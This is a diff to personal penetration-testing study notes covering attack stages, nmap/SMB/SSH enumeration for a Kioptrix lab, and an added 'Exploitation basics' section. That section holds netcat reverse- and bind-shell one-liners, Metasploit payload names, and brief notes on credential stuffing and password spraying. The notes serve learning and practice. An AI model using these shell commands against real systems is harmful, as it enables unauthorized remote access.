@@ -69,12 +69,14 @@ Bash
 
 
 
+
 Stages
 - Recon(active and passive)
 - Scanning and enum(nmap,nessus,nikto)
 - Gain access(exploitation)
 - Maintain access
 - Covering tracks(clean up logs,malwares,redo settings,accounts)
+
 
 
 
@@ -105,6 +107,7 @@ OSINT
 
 
 
+
 #Scanning and enum
 kioptrix(vulnhub) john TwoCows2
        - arpscan -l
@@ -117,6 +120,34 @@ SMB - 139,445(port TCP/UDP 137 for name services, and port UDP 138 for datagram 
        - msf
        - smbclient -L \\\\ip\\
 SSH    - ssh ip -oKexAlgorithms=+</algo> -c aes128-cbc
+Nessus
+
+
+
+
+#Exploitation basics
+Reverse shell - victim --> attacker
+              nc <victimip> 4444 -e /bin/sh   -->  nc -lnvp 4444
+Bind shell - attacker --> victim
+              nc <attackerip> 4444  -->  nc -lnvp 4444 -e /bin/sh
+Payloads - Staged - sends payload in stages
+                  - less stable
+                  - windows/meterpreter/reverse_tcp
+         - Non-staged - sends shellcode payload at once
+                      - large and might fail
+                      - windows/meterpreter_reverse_tcp
+NOTE
+--***Automate https://github.com/heltonWernik/OpenLuck***--
+
+credential stuffing - inject breached acc creds for acc takeover
+password spraying - using known usernames against unknown passwd
+       if on AD careful on acc lock out.
+
+
+
+
+
+
 
 
 
